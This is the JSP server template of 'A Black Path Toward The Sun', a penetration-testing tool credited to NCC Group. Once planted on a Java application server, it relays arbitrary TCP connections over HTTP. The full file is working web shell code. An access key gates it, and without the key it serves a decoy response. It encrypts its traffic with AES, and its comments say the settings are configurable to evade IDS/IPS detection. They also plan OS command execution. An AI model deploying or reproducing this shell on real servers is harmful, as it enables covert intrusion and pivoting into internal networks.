<%
/*

	This file is part of A Black Path Toward The Sun ("ABPTTS")

	Copyright 2016 NCC Group

	A Black Path Toward The Sun ("ABPTTS") is free software: you can redistribute it and/or modify
	it under the terms of version 2 of the GNU General Public License as published by
	the Free Software Foundation.

	A Black Path Toward The Sun ("ABPTTS") is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with A Black Path Toward The Sun ("ABPTTS") (in the file license.txt).
	If not, see <http://www.gnu.org/licenses/>.

	Version 1.0
	Ben Lincoln, NCC Group
	2016-07-30

	A Black Path Toward The Sun server component template file (JSP)
	
	Tested successfully on:
	
		Apache Tomcat
			3.3.2 (Oracle JRE 1.5.0_22 / Windows 7 / x86-64 / VMWare Fusion)
		
			4.1.40 (Oracle JRE 1.5.0_22 / Windows 7 / x86-64 / VMWare Fusion)

			5.5.36 (Oracle JRE 1.5.0_22 / Windows 7 / x86-64 / VMWare Fusion)
		
			6.0.0 (Oracle JRE 1.6.0_13-b03 / OpenSolaris 9 5.11 / x86 / VMWare Fusion)
		
			6.0.24-45.el6 (OpenJDK 1.6.0_24 / CentOS 6.3 / x86-64 / VMWare Fusion)
			
			6.0.45 (Oracle JRE 1.8.0_91-b15 / Windows 7 / x86-64 / VMWare Fusion)

			7.0.70 (Oracle JRE 1.8.0_91-b15 / Windows 7 / x86-64 / VMWare Fusion)

			8.0.14-1 (OpenJDK 1.7.0_79 / Debian 8 / x86-64 / VMWare Fusion)
			
			8.0.14-1 (OpenJDK 1.7.0_79 / Debian 8 / x86-64 / VirtualBox)

		IBM WebSphere Application Server
			8.5.5.0 gm1319.01 (IBM J9 VM (build 2.6, JRE 1.6.0 Windows 8 amd64-64) / Windows 10 / x86-64 / VMWare Fusion)
		
		JBoss
			5.1.0.GA (gij (GNU libgcj) 4.1.2 20080704 (Red Hat 4.1.2-52) / CentOS 5.8 / x86-64 / VMWare Fusion)

		Jetty
			9.3.6.v20151106 (Oracle JRE 1.8.0_71-b15 / Debian 8 / x86-64 / VMWare Fusion)
	
*/

%><%@page import="java.io.*,java.net.*,java.util.*,sun.misc.BASE64Decoder,sun.misc.BASE64Encoder,javax.naming.*,javax.servlet.jsp.PageContext,java.security.*,javax.crypto.*,javax.crypto.spec.*"%><%!

final public static char[] hexArray = "0123456789ABCDEF".toCharArray();

class SessionConnection
{
	public String ConnectionID;
	public int PortNumber;
	public String Host;
	public Socket Sock;
	public int UnusedIterations;
	public byte[] ReceiveBuffer;
	
	public SessionConnection()
	{
		ConnectionID = GenerateConnectionID();
		PortNumber = -1;
		Host = "";
		UnusedIterations = 0;
		ReceiveBuffer = new byte[0];
	}
	
	public void AddBytesToReceiveBuffer(byte[] newBytes)
	{
		if (newBytes.length > 0)
		{
			byte[] newReceiveBuffer = new byte[ReceiveBuffer.length + newBytes.length];
			System.arraycopy(ReceiveBuffer, 0, newReceiveBuffer, 0, ReceiveBuffer.length);
			System.arraycopy(newBytes, 0, newReceiveBuffer, ReceiveBuffer.length, newBytes.length);
			ReceiveBuffer = newReceiveBuffer;
		}
	}
	
	public byte[] GetBytesFromReceiveBuffer(int maxBytes)
	{
		int byteCount = maxBytes;
		if (byteCount > ReceiveBuffer.length)
		{
			byteCount = ReceiveBuffer.length;
		}
		byte[] result = new byte[byteCount];
		
		System.arraycopy(ReceiveBuffer, 0, result, 0, byteCount);
		
		if (byteCount == ReceiveBuffer.length)
		{
			ReceiveBuffer = new byte[0];
		}
		else
		{
			int newByteCount = ReceiveBuffer.length - byteCount;
			byte[] newReceiveBuffer = new byte[newByteCount];
			System.arraycopy(ReceiveBuffer, byteCount, newReceiveBuffer, 0, newByteCount);
			ReceiveBuffer = newReceiveBuffer;
		}
		return result;
	}
	
	public String GenerateConnectionID()
	{	
		Random r = new Random();
		
		byte[] connID = new byte[8];
		
		r.nextBytes(connID);
		
		return bytesToHex(connID);
	}
	
	public String bytesToHex(byte[] bytes)
	{
		char[] hexChars = new char[bytes.length * 2];
		for ( int j = 0; j < bytes.length; j++ )
		{
			int v = bytes[j] & 0xFF;
			hexChars[j * 2] = hexArray[v >>> 4];
			hexChars[j * 2 + 1] = hexArray[v & 0x0F];
		}
		return new String(hexChars);
	}
}

public byte[] hexStringToByteArray(String s) {
    int len = s.length();
    byte[] data = new byte[len / 2];
    for (int i = 0; i < len; i += 2) {
        data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                             + Character.digit(s.charAt(i+1), 16));
    }
    return data;
}

public byte[] GenerateRandomBytes(int byteCount)
{
	byte[] result = new byte[byteCount];
	new Random().nextBytes(result);
	return result;
}

public byte[] EncryptData(byte[] plainText, Cipher c, byte[] key, int blockSize) throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
{
	byte[] iv = GenerateRandomBytes(blockSize);
	// typical AES encryption depends on the IV alone preventing identical inputs from 
	// encrypting to identical outputs
	// MIT Kerberos uses a model in which the IV is set to all zeroes, but the first 
	// block of data is random, and then discarded on decryption
	// I think of this as a "reinitialization vector" that takes place on the other 
	// side of the encryption "looking glass". It should also help protect against 
	// theoretical known-plaintext vulnerabilities in AES.
	// why not use both? 
	byte[] reIV = GenerateRandomBytes(blockSize);
	SecretKey key2 = new SecretKeySpec(key, 0, key.length, "AES");
	c.init(Cipher.ENCRYPT_MODE, key2, new IvParameterSpec(iv));
	byte[] rivPlainText = new byte[plainText.length + blockSize];
	System.arraycopy(reIV, 0, rivPlainText, 0, reIV.length);
	System.arraycopy(plainText, 0, rivPlainText, blockSize, plainText.length);
	byte[] cipherText = c.doFinal(rivPlainText);
	byte[] ivCipherText = new byte[cipherText.length + blockSize];
	System.arraycopy(iv, 0, ivCipherText, 0, iv.length);
	System.arraycopy(cipherText, 0, ivCipherText, blockSize, cipherText.length);	
	return ivCipherText;
}

public byte[] DecryptData(byte[] cipherText, Cipher c, byte[] key, int blockSize) throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
{
	byte[] iv = new byte[blockSize];
	byte[] strippedCipherText = new byte[cipherText.length - blockSize];
	System.arraycopy(cipherText, 0, iv, 0, blockSize);
	System.arraycopy(cipherText, blockSize, strippedCipherText, 0, strippedCipherText.length);
	SecretKey key2 = new SecretKeySpec(key, 0, key.length, "AES");
	c.init(Cipher.DECRYPT_MODE, key2, new IvParameterSpec(iv));
	byte[] rivPlainText = c.doFinal(strippedCipherText);
	byte[] plainText = new byte[rivPlainText.length - blockSize];
	System.arraycopy(rivPlainText, blockSize, plainText, 0, plainText.length);
	return plainText;
}

%><%

/* Begin configurable options */

int serverSocketMaxUnusedIterations = %PLACEHOLDER_serverSocketMaxUnusedIterations%;

int serverSocketIOTimeout = %PLACEHOLDER_serverSocketIOTimeout%;
int serverSocketSendBufferSize = %PLACEHOLDER_serverSocketSendBufferSize%;
int serverSocketReceiveBufferSize = %PLACEHOLDER_serverSocketReceiveBufferSize%;

int serverToClientBlockSize = %PLACEHOLDER_serverToClientBlockSize%;

/* Most of the options in this section are configurable to avoid simplistic string-based IDS/IPS-type detection */
/* If they are altered, be sure to pass the corresponding alternate values to the Python client software */

String headerValueKey = "%PLACEHOLDER_headerValueKey%";
String encryptionKeyHex = "%PLACEHOLDER_encryptionKeyHex%";

String headerNameKey = "%PLACEHOLDER_headerNameKey%";

String accessKeyMode = "%PLACEHOLDER_accessKeyMode%";
String paramNameAccessKey = "%PLACEHOLDER_paramNameAccessKey%";

String paramNameOperation = "%PLACEHOLDER_paramNameOperation%";
String paramNameDestinationHost = "%PLACEHOLDER_paramNameDestinationHost%";
String paramNameDestinationPort = "%PLACEHOLDER_paramNameDestinationPort%";
String paramNameConnectionID = "%PLACEHOLDER_paramNameConnectionID%";
String paramNameData = "%PLACEHOLDER_paramNameData%";
String paramNamePlaintextBlock = "%PLACEHOLDER_paramNamePlaintextBlock%";
String paramNameEncryptedBlock = "%PLACEHOLDER_paramNameEncryptedBlock%";

String dataBlockNameValueSeparatorB64 = "%PLACEHOLDER_dataBlockNameValueSeparatorB64%";
String dataBlockParamSeparatorB64 = "%PLACEHOLDER_dataBlockParamSeparatorB64%";

String opModeStringOpenConnection = "%PLACEHOLDER_opModeStringOpenConnection%";
String opModeStringSendReceive = "%PLACEHOLDER_opModeStringSendReceive%";
String opModeStringCloseConnection = "%PLACEHOLDER_opModeStringCloseConnection%";

String responseStringHide = "%PLACEHOLDER_responseStringHide%";
String responseStringConnectionCreated = "%PLACEHOLDER_responseStringConnectionCreated%";
String responseStringConnectionClosed = "%PLACEHOLDER_responseStringConnectionClosed%";
String responseStringData = "%PLACEHOLDER_responseStringData%";
String responseStringNoData = "%PLACEHOLDER_responseStringNoData%";
String responseStringErrorGeneric = "%PLACEHOLDER_responseStringErrorGeneric%";
String responseStringErrorInvalidRequest = "%PLACEHOLDER_responseStringErrorInvalidRequest%";
String responseStringErrorConnectionNotFound = "%PLACEHOLDER_responseStringErrorConnectionNotFound%";
String responseStringErrorConnectionOpenFailed = "%PLACEHOLDER_responseStringErrorConnectionOpenFailed%";
String responseStringErrorConnectionCloseFailed = "%PLACEHOLDER_responseStringErrorConnectionCloseFailed%";
String responseStringErrorConnectionSendFailed = "%PLACEHOLDER_responseStringErrorConnectionSendFailed%";
String responseStringErrorConnectionReceiveFailed = "%PLACEHOLDER_responseStringErrorConnectionReceiveFailed%";
String responseStringErrorDecryptFailed = "%PLACEHOLDER_responseStringErrorDecryptFailed%";
String responseStringErrorEncryptFailed = "%PLACEHOLDER_responseStringErrorEncryptFailed%";
String responseStringErrorEncryptionNotSupported = "%PLACEHOLDER_responseStringErrorEncryptionNotSupported%";
String responseStringPrefixB64 = "%PLACEHOLDER_responseStringPrefixB64%";
String responseStringSuffixB64 = "%PLACEHOLDER_responseStringSuffixB64%";

/* End configurable options */

BASE64Decoder base64decoder = new BASE64Decoder(); 

String responseStringPrefix = new String(base64decoder.decodeBuffer(responseStringPrefixB64));
String responseStringSuffix = new String(base64decoder.decodeBuffer(responseStringSuffixB64));

String dataBlockNameValueSeparator = new String(base64decoder.decodeBuffer(dataBlockNameValueSeparatorB64));
String dataBlockParamSeparator = new String(base64decoder.decodeBuffer(dataBlockParamSeparatorB64));

int OPMODE_HIDE = 0;
int OPMODE_DEFAULT = 1;
int OPMODE_OPEN = 2;
int OPMODE_SEND_RECEIVE = 4;
int OPMODE_CLOSE = 8;
/* To do: file upload/download, OS command execution */
int OPMODE_UPLOAD = 16;
int OPMODE_DOWNLOAD = 32;
int OPMODE_CMD_EXEC = 64;

int opMode = OPMODE_HIDE;

int encryptionBlockSize = 16;

/* response.setBufferSize(6553600); */

byte[] encryptionKey = new byte[] {};

try
{
	encryptionKey = hexStringToByteArray(encryptionKeyHex);
}
catch (Exception ex)
{
	encryptionKey = new byte[] {};
}

Cipher cipher = null;

try
{
	cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
}
catch (Exception ex)
{
	cipher = null;
}


try
{
	if (accessKeyMode.equals("header"))
	{
		if (request.getHeader(headerNameKey).toString().trim().equals(headerValueKey.trim()))
		{
			opMode = OPMODE_DEFAULT;
		}
	}
	else
	{
		if (request.getParameter(paramNameAccessKey).toString().trim().equals(headerValueKey.trim()))
		{
			opMode = OPMODE_DEFAULT;
		}
	}
}
catch (Exception ex)
{
    opMode = OPMODE_HIDE;
}
%><%=responseStringPrefix%><%
if (opMode == OPMODE_HIDE)
{
	/* Begin: replace this block of code with alternate JSP code to use a different "innocuous" default response */
	/* E.g. copy/paste from your favourite server status page JSP */
    %><%=responseStringHide%><%
	/* End: replace this block of code with alternate JSP code to use a different "innocuous" default response */
}
if (opMode != OPMODE_HIDE)
{
	PageContext context;
	HttpSession currentSession;
	int DestPort = -1;
	String RequestedOp = "";
	String DestHost = "";
	String DataB64 = "";
	String ConnectionID = "";
	Hashtable Connections = new Hashtable();
	SessionConnection Conn = new SessionConnection();
	boolean encryptedRequest = false;
	String unpackedBlock = "";
	Hashtable unpackedParams = new Hashtable();
	boolean sentResponse = false;
	
	boolean validRequest = true;
	
	try
	{
		if ((request.getParameter(paramNameEncryptedBlock) != null) || (request.getParameter(paramNamePlaintextBlock) != null))
		{
			byte[] decodedBytes = new byte[0];
			if ((request.getParameter(paramNameEncryptedBlock) != null) && (cipher != null) && (encryptionKey.length > 0))
			{
				decodedBytes = base64decoder.decodeBuffer(request.getParameter(paramNameEncryptedBlock));
				try
				{
					byte[] decryptedBytes = DecryptData(decodedBytes, cipher, encryptionKey, encryptionBlockSize);
					unpackedBlock = new String(decryptedBytes, "UTF-8");
					encryptedRequest = true;
				}
				catch (Exception ex)
				{
					%><%=responseStringErrorDecryptFailed%><%
					/* return; */
					validRequest = false;
					sentResponse = true;
				}
			}
			else
			{
				decodedBytes = base64decoder.decodeBuffer(request.getParameter(paramNamePlaintextBlock));
				unpackedBlock = new String(decodedBytes, "UTF-8");
			}
			
			if (validRequest)
			{
				String[] paramArray = unpackedBlock.split(dataBlockParamSeparator);
				if (paramArray.length > 0)
				{
					for (int i = 0; i < paramArray.length; i++)
					{
						String currentParam = paramArray[i];
						String[] pvArray = currentParam.split(dataBlockNameValueSeparator);
						if (pvArray.length > 1)
						{
							unpackedParams.put(pvArray[0], pvArray[1]);
						}
					}
				}
			}
		}
	}
	catch (Exception ex)
	{
		validRequest = false;
	}
	
	if (validRequest)
	{		
		try
		{
			if (unpackedParams.containsKey(paramNameOperation))
			{
				RequestedOp = (String)unpackedParams.get(paramNameOperation);
			}
		}
		catch (Exception ex)
		{
			RequestedOp = "";
		}
		
		try
		{
			if (unpackedParams.containsKey(paramNameDestinationHost))
			{
				DestHost = (String)unpackedParams.get(paramNameDestinationHost);
			}
		}
		catch (Exception ex)
		{
			DestHost = "";
		}

		try
		{
			if (unpackedParams.containsKey(paramNameConnectionID))
			{
				ConnectionID = (String)unpackedParams.get(paramNameConnectionID);
			}
		}
		catch (Exception ex)
		{
			ConnectionID = "";
		}
		
		try
		{
			if (unpackedParams.containsKey(paramNameDestinationPort))
			{
				DestPort = (Integer.parseInt((String)unpackedParams.get(paramNameDestinationPort)));
			}
		}
		catch (Exception ex)
		{
			DestPort = -1;
		}
		
		try
		{
			if (unpackedParams.containsKey(paramNameData))
			{
				DataB64 = (String)unpackedParams.get(paramNameData);
			}
		}
		catch (Exception ex)
		{
			DataB64 = "";
		}
		
		if (RequestedOp.equals(""))
		{
			validRequest = false;
		}
	}
	
	if (validRequest)
	{
		if (RequestedOp.equals(opModeStringOpenConnection))
		{
			opMode = OPMODE_OPEN;
			if (DestHost.equals(""))
			{
				validRequest = false;
			}
			if (DestPort == -1)
			{
				validRequest = false;
			}
		}
		if (RequestedOp.equals(opModeStringSendReceive))
		{
			opMode = OPMODE_SEND_RECEIVE;
			if (ConnectionID.equals(""))
			{
				validRequest = false;
			}
		}
		if (RequestedOp.equals(opModeStringCloseConnection))
		{
			opMode = OPMODE_CLOSE;
			if (ConnectionID.equals(""))
			{
				validRequest = false;
			}
		}
	}
	
	if (!validRequest)
	{
		if (!sentResponse)
		{
			%><%=responseStringErrorInvalidRequest%><%
			/* return; */
		}
	}
	else
	{
		try
		{
			Connections = (Hashtable)session.getAttribute("SessionConnections");
			if (Connections == null)
			{
				Connections = new Hashtable();
			}
		}
		catch (Exception ex)
		{
			Connections = new Hashtable();
		}
		
		if (opMode == OPMODE_OPEN)
		{
			Conn = new SessionConnection();
			Conn.Host = DestHost;
			Conn.PortNumber = DestPort;
			ConnectionID = Conn.ConnectionID;
			try
			{
				Conn.Sock = new Socket(DestHost, DestPort);
				Conn.Sock.setSoTimeout(serverSocketIOTimeout);
				Conn.Sock.setSendBufferSize(serverSocketSendBufferSize);
				Conn.Sock.setReceiveBufferSize(serverSocketReceiveBufferSize);
				/* Conn.Sock.setTcpNoDelay(true); */
				Connections.put(ConnectionID, Conn);
				%><%=responseStringConnectionCreated%> <%=ConnectionID%><%
				sentResponse = true;
			}
			catch (Exception ex)
			{
				%><%=responseStringErrorConnectionOpenFailed%><%
				/* return; */
				validRequest = false;
				sentResponse = true;
			}
		}
	}
	
	if ((validRequest) && (opMode == OPMODE_SEND_RECEIVE) || (opMode == OPMODE_CLOSE))
	{
		if (Connections.containsKey(ConnectionID))
		{
			try
			{
				Conn = (SessionConnection)Connections.get(ConnectionID);
				if (Conn.Sock == null)
				{
					validRequest = false;
					Connections.remove(ConnectionID);
				}
			}
			catch (Exception ex)
			{
				validRequest = false;
			}
		}
		else
		{
			validRequest = false;
		}
		
		if (!validRequest)
		{
			if (!sentResponse)
			{
				%><%=responseStringErrorConnectionNotFound%><%
				/* return; */
				validRequest = false;
				sentResponse = true;
			}
		}
	}

	if ((validRequest) && (opMode == OPMODE_SEND_RECEIVE))
	{
		InputStream is = null;
		try
		{
			is = Conn.Sock.getInputStream();
		}
		catch (Exception ex)
		{
			Conn.Sock = new Socket(DestHost, DestPort);
			Conn.Sock.setSoTimeout(serverSocketIOTimeout);
			Conn.Sock.setSendBufferSize(serverSocketSendBufferSize);
			Conn.Sock.setReceiveBufferSize(serverSocketReceiveBufferSize);
			/* Conn.Sock.setTcpNoDelay(true); */
			is = Conn.Sock.getInputStream();
		}
		DataInputStream inStream = new DataInputStream(is);
		DataOutputStream outStream = new DataOutputStream(Conn.Sock.getOutputStream());
		
		byte[] bytesOut = base64decoder.decodeBuffer(DataB64);
		
		boolean socketStillOpen = true;
		
		try
		{
			outStream.write(bytesOut);
			outStream.flush();
		}
		catch (Exception ex)
		{
			socketStillOpen = false;
			opMode = OPMODE_CLOSE;
		}
		
		byte[] bytesIn = new byte[0];
		
		if (socketStillOpen)
		{
			byte[] buf = new byte[6553600];
			int maxReadAttempts = 65536000;
			maxReadAttempts = 1000;
			int readAttempts = 0;
			int nRead = 0;
			boolean doneReading = false;
			try
			{
				nRead = inStream.read(buf);
				if (nRead < 0)
				{
					doneReading = true;
				}
			}
			catch (Exception ex)
			{
				doneReading = true;
			}
			while (!doneReading)
			{
				byte[] newBytesIn = new byte[bytesIn.length + nRead];
				if (bytesIn.length > 0)
				{
					System.arraycopy(bytesIn, 0, newBytesIn, 0, bytesIn.length);
				}
				if (nRead > 0)
				{
					System.arraycopy(buf, 0, newBytesIn, bytesIn.length, nRead);
					bytesIn = newBytesIn;
				}
				try
				{
					nRead = inStream.read(buf);
					if (nRead < 0)
					{
						doneReading = true;
					}
				}
				catch (Exception ex)
				{
					doneReading = true;
				}
				readAttempts++;
				if (readAttempts > maxReadAttempts)
				{
					doneReading = true;
				}
			}
			
			synchronized(session)
			{
				Conn.AddBytesToReceiveBuffer(bytesIn);
			}
		}
		
		if (Conn.ReceiveBuffer.length > 0)
		{
			String OutB64 = "";
			BASE64Encoder base64encoder = new BASE64Encoder();
			byte[] toClient = new byte[0];
			synchronized(session)
			{
				toClient = Conn.GetBytesFromReceiveBuffer(serverToClientBlockSize);
			}
			if (encryptedRequest)
			{
				try
				{
					byte[] encryptedBytes = EncryptData(toClient, cipher, encryptionKey, encryptionBlockSize);
					OutB64 = base64encoder.encode(encryptedBytes);
				}
				catch (Exception ex)
				{
					%><%=responseStringErrorEncryptFailed%><%
					/* return; */
					validRequest = false;
					sentResponse = true;
				}
			}
			else
			{
				OutB64 = base64encoder.encode(toClient);
			}
			if (!sentResponse)
			{
				%><%=responseStringData%> <%=OutB64%><%
				sentResponse = true;
			}
		}
		else
		{
			if (!sentResponse)
			{
				%><%=responseStringNoData%><%
				sentResponse = true;
			}
		}
	}
	
	if ((validRequest) && (opMode == OPMODE_CLOSE))
	{
		try
		{
			Conn.Sock.close();
			if (!sentResponse)
			{
				%><%=responseStringConnectionClosed%> <%=ConnectionID%><%
				sentResponse = true;
			}
		}
		catch (Exception ex)
		{
			if (!sentResponse)
			{
				%><%=responseStringErrorConnectionCloseFailed%><%
				sentResponse = true;
			}
		}
	}
	
	if (validRequest)
	{	
		synchronized(session)
		{
			try
			{
				Connections = (Hashtable)session.getAttribute("SessionConnections");
				if (Connections == null)
				{
					Connections = new Hashtable();
				}
			}
			catch (Exception ex)
			{
				Connections = new Hashtable();
			}
			
			/* Update the current connection (if one exists), and remove stale connections */
			
			if (!ConnectionID.equals(""))
			{
				Conn.UnusedIterations = 0;
				if (Connections.containsKey(ConnectionID))
				{
					Connections.remove(ConnectionID);
					if (opMode != OPMODE_CLOSE)
					{
						Connections.put(ConnectionID, Conn);
					}
				}
				else
				{
					Connections.put(ConnectionID, Conn);
				}
			}
			
			Enumeration connKeys = Connections.keys();
			while (connKeys.hasMoreElements())
			{
				String cid = (String)connKeys.nextElement();
				if (!cid.equals(ConnectionID))
				{
					SessionConnection c = (SessionConnection)Connections.get(cid);
					Connections.remove(cid);
					c.UnusedIterations++;
					if (c.UnusedIterations < serverSocketMaxUnusedIterations)
					{
						Connections.put(cid, c);
					}
					else
					{
						try
						{
							c.Sock.close();
						}
						catch (Exception ex)
						{
							// do nothing
						}
					}
				}
			}
			
			session.setAttribute("SessionConnections", Connections);
		}
	}
}
%><%=responseStringSuffix%><%
%>